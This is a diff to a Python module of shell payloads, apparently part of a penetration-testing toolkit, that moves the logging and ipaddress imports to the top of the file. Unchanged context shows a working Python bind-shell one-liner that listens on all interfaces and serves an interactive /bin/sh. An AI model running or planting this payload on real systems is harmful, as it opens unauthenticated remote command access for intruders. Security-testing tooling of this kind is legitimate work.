@@ -5,8 +5,12 @@ Common payloads for reverse shells, bind shells, and web shells.
 """
 
 import base64
+import ipaddress
+import logging
 from collections.abc import Callable
 from dataclasses import dataclass
+
+logger = logging.getLogger(__name__)
 
 
 @dataclass
@@ -253,9 +257,6 @@ def bind_shell_bash(lport: int) -> str:
 def bind_shell_python(lport: int) -> str:
     """Python bind shell."""
     return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
-import ipaddress
-import logging
-logger = logging.getLogger(__name__)
 
 
 def _validate_lhost_lport(lhost: str, lport: int) -> tuple[str, int] | None:
